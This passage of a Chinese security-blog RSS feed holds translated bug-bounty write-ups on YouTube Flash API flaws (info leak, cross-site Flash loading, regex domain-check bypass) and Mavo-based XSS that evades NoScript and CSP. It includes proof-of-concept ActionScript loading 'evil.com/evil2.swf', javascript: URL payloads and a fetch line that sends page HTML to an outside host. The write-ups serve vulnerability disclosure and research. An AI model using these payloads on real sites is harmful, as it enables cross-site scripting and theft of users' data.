RegExp(&quot;^https?://((www\.|encrypted\.)?google(\.com|\.co)?\.[a-z]{2,3}/(search|webhp)\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf|www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris|tpc\.googlesyndication\.com/safeframe/|lightbox-(demos|builder)\.appspot\.com/|([A-Za-z0-9-]{1,63}\.)*(imasdk\.googleapis\.com|corp\.google\.com|borg\.google\.com|docs\.google\.com|drive\.google\.com|googleads\.g\.doubleclick\.net|googleplex\.com|play\.google\.com|prod\.google\.com|sandbox\.google\.com|photos\.google\.com|picasaweb\.google\.com|lh2\.google\.com|plus\.google\.com|books\.googleusercontent\.com|mail\.google\.com|talkgadget\.google\.com|survey\.g\.doubleclick\.net|youtube\.com|youtube\.googleapis\.com|youtube-nocookie\.com|youtubeeducation\.com|vevo\.com)(:[0-9]+)?([\/\?\#]|$))&quot;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;在读余下的文章之前，我强烈建议读者先试着找出上面这条式子的错误&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;--------------------余下正文----------------------&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;`.`（点）在正则表达式中代表着通配符。如果你想匹配一个普通的点，那么你要用`\.`的方式escape。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在trustedLoader的正则中，我们发现了如下代码：&lt;/p&gt;&lt;p&gt;24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;注意到了吗？这里的点并不表示匹配`.`符号（而是一个通配符）。哪怕传递的是不被谷歌控制的url&lt;i&gt;（比如 http://24e12c4a-a-95274a9c-s-sitesAgooglegroups.com/a/google.com/flash-api-test-harness/apiharness.swf ，注意大写的A）&lt;/i&gt;，它也会返回true。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我花了一美刀买下了这个域名，再让 swf 调用私有命令 updateVideoData() 来任意执行命令。因为 updateVideoData 的工作原理和 loadPlaylist 类似，我就不再放上PoC了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;trustedLoader，再一次！&lt;/h2&gt;&lt;p&gt;我们再来看看其他表达式：`google(\.com|\.co)?\.[a-z]{2,3}`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;很遗憾，我们可以轻松绕过这一防御：`google.com.fun`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;以及这个：&lt;i&gt;www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;正则本身没有问题，然而&lt;a href=&quot;http://www.gstatic.com/&quot;&gt;www.gstatic.com&lt;/a&gt;存在许多XSS。我们能通过XSS让 &lt;i&gt;www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris &lt;/i&gt;加载 Youtube 的 iframe，最后发送 updateVideoData() 来X站。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是大概的工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-09c6bd5094d7309e827bc6f7a46bb036_r.jpg&quot; data-rawwidth=&quot;1852&quot; data-rawheight=&quot;816&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前提：目标安装了Flash并打开 &lt;i&gt;www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf?chartId=[javascript代码]&lt;/i&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;js代码先让 &lt;a href=&quot;http://www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf&quot;&gt;www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf&lt;/a&gt; 加载了一个到` &lt;a href=&quot;https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris%60&quot;&gt;https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris&lt;/a&gt; 的iframe&lt;/li&gt;&lt;li&gt;js代码再让 https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris 加载一个倒 youtube 的 iframe。&lt;/li&gt;&lt;li&gt;iframe发送一个 updateVideoData()。过滤器没有检测出异常，并接受了请求&lt;/li&gt;&lt;li&gt;主程序加载了恶意Flash，成功地执行了XSS&lt;/li&gt;&lt;/ol&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-23-29603213</guid>
<pubDate>Sat, 23 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>看我如何将flash漏洞死灰复燃（2&amp;3部分）</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-19-29469971.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;看我如何将flash漏洞死灰复燃（2&amp;amp;3部分）&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29469971&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c14ebfdcfe0b340d07d57a75344431e6_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;2 通过 appLoader 进行 XSF&lt;/h2&gt;&lt;p&gt;我在前一章节中介绍了 youtube 的一个信息泄露漏洞。在这一章节里，我将介绍一个任意Flash 代码执行漏洞。这一类漏洞十分像 XSS，只不过我们通常称呼其为跨站点 Flash 执行(XSF) 或者 Flash SOP 绕过。这一章节理解起来可能比较困难，我强烈建议读者到&lt;a href=&quot;http://www.senocular.com/flash/tutorials/contentdomains/&quot;&gt;[这里]&lt;/a&gt;预习背景知识。&lt;/p&gt;&lt;p&gt;让我们先来看看 Youtube 的 Flash API 及其安全沙箱：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c14ebfdcfe0b340d07d57a75344431e6_r.png&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;328&quot;&gt;&lt;p&gt;Loader（加载文件）对象能通过以下两种方式加载外部 Flash 文件：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通过正常的 Loader.load() 方式加载（类似 `iframe`，即两个 Flash 都有独立的安全沙箱）&lt;/li&gt;&lt;li&gt;如果 loader 使用了参数 `SecurityDomain.currentDomain`，那么被加载的 flash 文件就会和loader 在同一沙箱内执行（可以比作`&amp;lt;script src=&quot;&quot;&amp;gt;`）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&amp;gt; 注意，虽然图中的主程序和其加载的模块都属于同一个域名，但参数`SecurityDomain.currentDomain` 才是它们在同一个沙箱的原因&lt;/p&gt;&lt;p&gt;在第一章中，我们已经能通过 `youtubeWrapper.getChildAt(0)` 获得 Youtube appLoader 的属性了。这一次，我们可以用 `appLoader.load(“evil.com/evil2.swf”,&lt;br&gt;SecurityDomain.currentDomain)` 让 appLoader 加载任意外部文件到主文件的沙箱中。&lt;/p&gt;&lt;p&gt;这是大致流程：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f35ed5b6664589f6d52e045e8e5ea950_r.png&quot; data-rawwidth=&quot;1609&quot; data-rawheight=&quot;596&quot;&gt;&lt;p&gt;PoC：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var loader = new Loader();
// 加载 Youtube Wrapper (1)
loader.load(new
URLRequest(&quot;https://www.youtube.com/v/[VIDEO_ID]&quot;));
var youtubeWrapper = loader.content;
// 获得 Youtube Wrapper的appLoader对象
(3)
var appLoader = youtubeWrapper.getChildAt(0);
// 加载 evil2.swf 到 youtubeWrapper security sandbox. (4)
appLoader.load(new
URLRequest(&quot;http://evil.com/evil2.swf&quot;), new LoaderContext(false,
ApplicationDomain.currentDomain, SecurityDomain.currentDomain));
// 现在可以任意代码执行了！ (5)&lt;/code&gt;&lt;h2&gt; 一些技术细节：&lt;/h2&gt;&lt;p&gt;根据 flash 的官方文档，SecurityDomain.currentDomain 表示的是当前被写入沙箱的地址。事实上，它的变化远比官方描述的要复杂。&lt;/p&gt;&lt;p&gt;appLoader 确实是由 Youtube Wrapper 初始化的，但 appLoader 的`appLoader.load(evil.com/evil2.swf,SecurityDomain.currentDomain )` 却被算为 evil.swf 的调用。如果你对 flash 进行 debug，你会发现 evil2.swf 先被加载到 evil.swf 的沙箱。当 Youtube Wrapper 初始化完 appLoader 后，evil2.swf 又会返回到 Youtube 沙箱中执行。&lt;/p&gt;&lt;p&gt;加载完后，Flash Player 允许它发送请求到 `https://www.youtube.com/` 域名下的任意路径并用 `URLLoader` 读取任意响应&lt;/p&gt;&lt;p&gt;&amp;gt; URLLoader 相当于 JavaScript 的 XHR&lt;/p&gt;&lt;h2&gt;3 通过 loaderinfo.url 进行 XSF&lt;/h2&gt;&lt;p&gt;让我们来看看主程序是如何加载模块的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-778139ea1cbee5edbb51342d73c60d90_r.png&quot; data-rawwidth=&quot;1337&quot; data-rawheight=&quot;320&quot;&gt;&lt;p&gt;通过插入自己的 URL(2) 以及替换文件名（更改 `watch_as3.swf` 为 `subtitles.swf`)，主程序可以动态生成模块的 URL 并处理多个版本。与此同时，主程序使用 `loaderInfo.url` 获得自己的url。&lt;/p&gt;&lt;p&gt;&amp;gt; appLoader 可以比作 html 的 iframe，它的 appLoader.loaderInfo.url 属性类似于 iframe 的src。不同的是 flash 可以同时加载多个 swf 文件，而 iframe 只能加载一个 url&lt;/p&gt;&lt;p&gt;但 loaderInfo.url 十分奇特，如果 appLoader 加载完主程序后直接载入其他 Flash 文件，主程序的 loaderInfo.url 会变成最新加载的 flash 的 url（而不是主程序的 url）。当主程序需要 url获取其它模块时，攻击者便有利可图。&lt;/p&gt;&lt;p&gt;POC 工作流程:&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-57c4a086ef0fe61c2d46007523b844c7_r.png&quot; data-rawwidth=&quot;1540&quot; data-rawheight=&quot;591&quot;&gt;&lt;p&gt;如图所示，我们先移除 Youtube Wrapper，再用 Evil Wrapper 代替它。Evil Wrapper 会先加载主程序（1），然后再加载另一个文件 Noop.swf（2）。当主程序尝试加载模块时，它将获取appLoader url 的值（3）(此时 loaderInfo.url 是 evil.com/Noop.swf，而主程序期盼的是s.ytime.com/watch_as3.swf) 并以该 domain 为基础更改模块地址(最终结果为evil.com/subtitles.swf)，最后导致任意 Flash 代码执行（4）&lt;/p&gt;&lt;p&gt;此时的 Evil Module 则被映射到 s.ytimg.com/[[IMPORT]]/evil.com/subtitles.swf。由于`s.ytimg.com` 处于沙箱中，我们不能用代码去获取 `https://s.ytimg.com/` 的 cookie，CSRF&lt;br&gt;token。&lt;/p&gt;&lt;p&gt;不过在第二章中，我介绍了和 XHR 类似的 URLLoader。如果一个服务器上的crossdomain.xml 允许 `s.ytimg.com`，那么我们可以对该服务器发起跨域请求。&lt;/p&gt;&lt;p&gt;&amp;gt; crossdomain.xml 的和 CORS 头的作用类似&lt;/p&gt;&lt;p&gt;所幸的是，谷歌的绝大部分域名都允许来自 `https://s.ytime.com/` 的跨域请求。因此我们可以直接通过跨域得到/篡改用户的敏感信息（比如读取 google doc 的文档，以被攻击者的身份在youtube 上传视频）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;作者：Enguerran Gillier——&lt;/i&gt;&lt;/b&gt;&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/&quot;&gt;https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-19-29469971</guid>
<pubDate>Tue, 19 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>用 javascript 框架绕过 XSS 防御</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-15-29358971.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;用 javascript 框架绕过 XSS 防御&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29358971&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在 AppSec Europe Sebastian Lekies 中，Krzysztof Kotowicz 和 Eduardo Vela Nava 展示了如何使用 javascript 框架来绕过 XSS 保护。在这篇文章中，我也会讲解如何利用 Mavo 来突破防御(特别是 NoScript 过滤器)。Marvo 允许开发者用纯 HTML 创建可交互的 Web App。它在 Smashing magzine 公布并很快引起了我的兴趣，因此我开始分析其符号标记及功能。&lt;/p&gt;&lt;h2&gt;$url的 DOM XSS&lt;/h2&gt;&lt;p&gt;通过 Mavo 的 $url，开发者可以方便地得到 GET 参数。比方说你想得到参数 x，那么你可以这么写：`$url.x //retrieves the GET parameter x`&lt;/p&gt;&lt;p&gt;很遗憾，这种方便也会带来 DOM 类型的 XSS。我在17年五月份汇报过类似问题给 CSS 工作组。他们用 Mavo 管理评论并设置 $url 参素为 href，代码大致如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;h1&amp;gt;&amp;lt;a href=&quot;{$url.spec}&quot;mv-attribute=&quot;null&quot;property=&quot;title&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;p&gt;如你所见，他们通过 $url 获取参数。然而，这个链接只有在获取了有效数据的情况下才会被展示。我可以注入一个 javascript 伪协议，让其获得有效数据并回显：`javascript:alert(1)%252f%252f..%252fcss-images`&lt;/p&gt;&lt;p&gt;上面的攻击向量提供了一个相对路径。这样，Mavo 会先进入不存在的 javascript:alert(1) 文件夹，再通过`..`穿越到父目录读取有效的 css-images。除此之外，我还添加了两个换行符注释掉后面的非法语句，当目标点开这个链接时，就能保证用户正常执行代码。Mavo 至今依然有类似问题，有兴趣的可以点击[Poc]复现。&lt;/p&gt;&lt;h2&gt;远程加载 JSON 数据&lt;/h2&gt;&lt;p&gt;Mavo 支持用户通过 source 将 Mavo App 的数据源改为 local storage 或者其它位置。这一特性无疑大大地方便了攻击者篡改网页内容或者注入恶意 javascript URL。讽刺的是，Mavo 主页的 Demo 恰好有此类漏洞。我们可以用参数指向外部 JSON 文件(在跨域访问之前，记得开启“Access-Control-Allow-Origin:* ”头)并任意修改该 app 的数据。漏洞代码如下：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;a property=&quot;companyURL&quot;
mv-attribute=&quot;null&quot; href=&quot;[companyURL]&quot;
target=&quot;_blank&quot;&amp;gt;http://lea.verou.me&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此处的 href 使用了一个 Mavo 的表达式。&quot;companyURL&quot;是从 JSON 中加载的。如果我们包含了如下 JSON 文件：&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
&quot;companyLogo&quot;:
&quot;http://lea.verou.me/logo.svg&quot;,
&quot;companyName&quot;:
&quot;Pwnd Pwnd&quot;,
&quot;companyAddress&quot;:
&quot;Pwnd&quot;,
&quot;companyURL&quot;:
&quot;javascript:alert(1)&quot;,
&quot;companyEmail&quot;:
&quot;pwnd&quot;,
...&lt;/code&gt;&lt;p&gt;那么恶意的 javascript 协议会被引入，点击&lt;a href=&quot;http://portswigger-labs.net/mavo_invoice/?source=http://subdomain1.portswigger-labs.net/mavo_invoice/invoices.php&quot;&gt;[这里]&lt;/a&gt;复现。&lt;/p&gt;&lt;h2&gt;绕过 NoScript 检测&lt;/h2&gt;&lt;p&gt;Mavo 默认允许我们在 HTML 文件中添加 MavoScript（这个 DSL 加入了对 js 的一些改善和扩展）。说我们可以用 and，or，mod 代替符号运算。其中，=符号被用来判断（js 中是赋值）。再者，调用数学相关的方法时，我们不必使用 Math 对象（比方说直接 max(1,2,3)）。&lt;a href=&quot;https://mavo.io/docs/mavoscript/&quot;&gt;[这里]&lt;/a&gt;有更多信息。&lt;/p&gt;&lt;p&gt;如果 Mavo 解析到了无效的 MavoScript，那么其会被回滚，并用 javascript parser 解析该段代码。&lt;/p&gt;&lt;p&gt;比方说，我们想在 HTML 中计算1+1，那么我们可以通过[]插入表达式（类似 Angualr 的{{}}）：` [ 1+1 ] `&lt;/p&gt;&lt;p&gt;虽然 Mavo 并没有沙箱机制，但是我们的代码会被重写并在 with 中执行。因此，我们在调用的时候需要用到 self 或者 window 对象：`[self.alert(1)]`&lt;/p&gt;&lt;p&gt;Mavo 也支持 property 属性。它会将 DOM 元素和 javascript 变量关联起来，比方说：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;p&amp;gt;Slider value: [strength]/100&amp;lt;/p&amp;gt;
&amp;lt;input type=&quot;range&quot; property=&quot;strength&quot;
title=&quot;[strength]%&quot; /&amp;gt;&lt;/code&gt;&lt;p&gt;我们还注意到其它几个有意思的表达式：mv-value 和 mv-if 能脱离[]执行脚本。如果表达式为false，mv-if 会改变 DOM 值。值得注意的是这一表达式在任意标签上都可以使用：&lt;/p&gt;&lt;p&gt;`&amp;lt;div mv-if=”false”&amp;gt;Hide me&amp;lt;/div&amp;gt;`&lt;/p&gt;&lt;p&gt;在表达式中，MavoScript 有更有意思的行为。你可以使用没被双引号括起来的字符串（前提是它们需要包含字符，数字，或者下划线）。如果对象属性不存在的话，它们会被转换为空字符。&lt;/p&gt;&lt;p&gt;了解了这么多之后，我开始研究如何绕过 NoScript 过滤器，DOM 过滤器，和 CSP。其中，绕过 DOM 过滤器最为简单。因为你可以使用 data-* 属性来绕过 HTML 验证。在 Mavo 中，如果你要启用 CSP，就不得不开启 unsafe-eval。这意味着我们多了用 eval 直接执行字符串的危险。&lt;/p&gt;&lt;p&gt;我和 NoScript 的作者来了一场对抗赛，我的目标很简单：绕过 NoScript 并外带数据。我的第一个绕过是通过一个简单的 fetch 达成的：`[1 and self.fetch(&#39;//subdomain2.portswigger-labs.net/&#39;&amp;amp;encodeURIComponent(document.body.innerHTML))]`&lt;/p&gt;&lt;p&gt;因为 NoScript 过滤器看不懂 and，方括号和&amp;amp;，我可以通过&amp;amp;拼接字符串并发送 HTML。&lt;/p&gt;&lt;p&gt;后来 NoScript 开始检测这些关键字，不过我再一次 bypass 了它：`[&#39;&#39;=&#39;&#39;or self.alert(lol)]`。此处的=是用来判断，由于 javascript 并没有定义紧随其后的 or，所以 NoScript 不会认为后面的代码为 javascript。&lt;/p&gt;&lt;p&gt;正如我前面说的那样，mv- 属性允许表达式自定义分隔符（默认是：[]）执行 MavoScript。当NoScript 开始检查[]时，我们可以用该属性进一步绕过：`&amp;lt;div data-mv-expressions=&quot;lolx&lt;br&gt;lolx&quot;&amp;gt;lolxself.alert(&#39;lol&#39;)lolx&amp;lt;/div&amp;gt;`&lt;/p&gt;&lt;p&gt;接下来，我开始研究如何用 html 中的 Mavo 表达式绕过防御。通过在HTML中插入 javascript&lt;br&gt;url，我们可以轻易绕过 CSP：“&amp;lt;a href=[javascript&amp;amp;&#39;:alert(1)&#39;]&amp;gt;test&amp;lt;/a&amp;gt;”。虽然没有引号，这里的 `javascript` 是一个字符串，payload 再用&amp;amp;将 `javascript` 和 `&#39;:alert(1)&#39;` 拼合在一起。&lt;/p&gt;&lt;p&gt;后来 NoScript 作者又将上述 bypass 封杀，不过我发现了用多重表达式配合 tag 属性的绕过技巧：`&amp;lt;a href=&#39;[javascript][&quot;:&quot;][x.title][1][x.rel]&#39; rel=) id=x title=alert(&amp;gt;test&amp;lt;/a&amp;gt;`，或者：`&amp;lt;a href=javascript[x.rel]1)id=x rel=:alert(&amp;gt;test&amp;lt;/a&amp;gt;`&lt;/p&gt;&lt;p&gt;除此之外，我还可以用`/**/`强制 Mavo 解析器变为 javascript 模式，再用 js 的方式拼接字符串：`[/**/x=&#39;javascript&#39;][/**/x+=&#39;:alert&#39;+y.rel+y.title]&amp;lt;a href=[x] id=y title=1) rel=(&amp;gt;test&amp;lt;/a&amp;gt;`&lt;/p&gt;&lt;p&gt;如果函数调用末尾紧跟着数字，NoScript 就不会检查这个语句。而在 Mavo 中，mod 是一个运算符，因此我们可以用它在在函数后面接数字。由于我们并不需要空格（1%1不需要空格，所以1mod1也不用，毕竟它是一个运算符），NoScript 也不会检查该语句了：`[self.alert(1)mod1]`&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;由于引入了大量特殊符号，Mavo 会大大地削弱 CSP，NoScript 等保护机制。除了传统的 DOM XSS 外，Mavo 还引入了数据源劫持等新型漏洞。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者：&lt;b&gt;Gareth Heyes——&lt;/b&gt;&lt;a href=&quot;http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html&quot;&gt;blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-15-29358971</guid>
<pubDate>Fri, 15 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>看我如何将 Flash 漏洞死灰复燃（1）</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-09-29195210.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;看我如何将 Flash 漏洞死灰复燃（1）&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29195210&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Flash 不是一个 Dead App 了吗？&lt;/h2&gt;&lt;p&gt;尽管 Flash 安全的山河日渐衰败，但它依然不可小觑。哪怕是在今年，我也汇报了许多 flash 相关的漏洞给 Facebook，Youtube，WordPress，Yahoo 等公司。在近三年中，我在漏洞奖励项目中至少交了50个 Flash 漏洞。这些漏洞给我带来高达8万刀的奖励。然而这只是冰山一角，Flash 的漏洞远不仅如此。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fe7713ffe1d1548a0a6e1310d07f8d36_r.jpg&quot; data-rawwidth=&quot;300&quot; data-rawheight=&quot;184&quot;&gt;&lt;p&gt;虽然 Flash 在离我们远去，新引进的 javascript/HTML5 却带来新的一波问题。比方说 CORS滥用，由 XHR 或者 postMessage 引发的 DOM XSS。了解 Flash 曾犯下的安全问题有助于我们修补新时代的漏洞。Youtube 最新的 html5 API 就是由 Flash Api 移植的，这无疑值得我们探索。&lt;/p&gt;&lt;p&gt;在余下的篇幅中，我会介绍一些我在 Youtube Flash Api 中找到的精品Flash漏洞。由此引入 html/javascript 的一些安全技巧。&lt;/p&gt;&lt;h2&gt;对 Youtube Flash API 的逆向&lt;/h2&gt;&lt;p&gt;Youtube 的 Flash Api 使用户可以外链它的视频。下图大致描述了其工作流程：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f6524a1333536281bfb19e59ece4f27a_r.jpg&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;286&quot;&gt;&lt;p&gt;Youtube 的 Wrapper 位于 `youtube.com/v/[VIDEO_ID]` 的一个 Flash 文件。而主程序在 `domain s.ytimg.com`。剩下的模块则负责处理广告、副标题等内容。除了 Flash 到 javascript API，我们还可以发送 `play()`，`pause()` 等命令。Flash 文件会通过类似 ajax 的方式跨域请求视频数据及配置。&lt;/p&gt;&lt;h2&gt;漏洞1：用户信息泄漏&lt;/h2&gt;&lt;p&gt;我们先从一个简单的漏洞入手，这是一段精简过的 Flash ActionScript3 代码：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;public class YoutubeWrapper extends Sprite{
private var user_name =
&quot;The Victim&quot;;
private var user_picture =
&quot;https://googleusercontent.com/.../victim_photo.jpg&quot;;
private var appLoader =
new Loader();

public function
YoutubeWrapper(){
// 允许外部js/Flash获取其公开属性
Security.allowDomain(&quot;*&quot;);
// 加载主程序
this.appLoader
.load(new URLRequest(&quot;https://s.ytimg.com/.../watch_as3.swf&quot;);
// 将其加入为display container的child
this.addChild(this.appLoader );
//
loaderInfo.sharedEvents Api
this.loader.contentLoaderInfo.sharedEvents
.addEventListener(&quot;REQUEST_USERINFO&quot;, this.onRequestUserinfo);
}
private function
onRequestUserinfo(event:Event){
// 将用户信息写入event.data
// 我们可以通过 sharedEvents caller 获取它
event.data.user_name =
this.user_name;
event.data.user_image
= this.user_image;
}
}&lt;/code&gt;&lt;p&gt;Youtube Wrapper（包装页面）的属性 “user_name” 包含了谷歌帐号名（在登录了谷歌的情况下）。“user_picture” 则包含了到用户头像的链接。我们是否可以通过某种方法获取这些属性呢？&lt;/p&gt;&lt;p&gt;Youtube Wrapper 能够被开发者的 Flash 文件加载。然而它们都被沙箱政策限制着。&lt;/p&gt;&lt;p&gt;&amp;gt; 在 Flash 中引入外部 Flash 和加载 iframe 类似。如果 iframe 不是同源的，那么它就不能获得父页面的属性。&lt;/p&gt;&lt;p&gt;Youtube Wrapper 包含了 `Security.allowDomain(“*”)`，javascript 便可以向它发送 `play()`、`pause()` 等命令。这意味着在同一个沙箱中，攻击者的Wrapper可以获取任意 Youtube Wrapper 的公开属性。不幸的是，我们并不能获得私有属性。&lt;/p&gt;&lt;p&gt;让我们把目光移向 loaderInfo.sharedEvents，这个 API 允许 Loader 和被加载的文件互相通信。Youtube Wrapper 就用这个 API 和主程序通信。当主程序发送一个事件给 sharedEvent API 时，Youtube Wrapper 会接收该事件并返回 event.data 的信息。&lt;/p&gt;&lt;p&gt;除了 loader 和被加载的文件之外，任何有 loaderInfo 对象 reference（引用）的 Flash 文件都可以调用 loaderInfo.sharedEvents。&lt;/p&gt;&lt;p&gt;&amp;gt; 这个方法类似 postMessage。它们都提供了跨域通信的方式。不仅如此，只要对一个 iframe或者其父页面有 reference，其它窗口也可以调用 postMessage。只要用 window.open 或者window.frames，任意域名都可以访问到 reference。&lt;/p&gt;&lt;p&gt;如果我们可以访问到 loaderInfo 对象，我们就可以窃取用户信息了。可惜的是，loaderInfo 是Youtube Wrapper 的一个私有属性。&lt;/p&gt;&lt;p&gt;不过，当用 Loader 时，我们需要将其添加为 Display Contianer 的 child 以播放被加载的文件。通常来讲，我们会用 `this.addChild(this.loader);` 实现（Youtube Wrapper 也是这么做的）。Youtube Wrapper 还有一个公开的 `getChildAt()` 方法，这个函数会返回 loader 对象。我们可以通过它绕过前面的私有属性限制。&lt;/p&gt;&lt;p&gt;我们可以进一步使用 `YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents` 发送事件给Youtube。Youtube Wrapper 便会返回 event.data，泄漏隐私大功告成！&lt;/p&gt;&lt;p&gt;PoC：&lt;/p&gt;&lt;code lang=&quot;as3&quot;&gt;var loader = new Loader();
// 加载Youtube Wrapper
loader.load(new
URLRequest(&quot;https://www.youtube.com/v/[VIDEO_ID]&quot;));
var youtubeWrapper = loader.content;
// 访问Youtube AppLoader对象
var appLoader = youtubeWrapper.getChildAt(0);
// 访问appLoader的loaderInfo.sharedEvents
var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;
// 准备要发给Youtube Wrapper的事件
var leakEvent = new Event(&quot;Request_username&quot;);
leakEvent.data = new Object();
// 发送leakEvent到LeakingSharedEvents
LeakingSharedEvents.dispatchEvent(leakEvent);

// 现在可以获得用户名和图像了
trace(leakEvent.data.user_name);
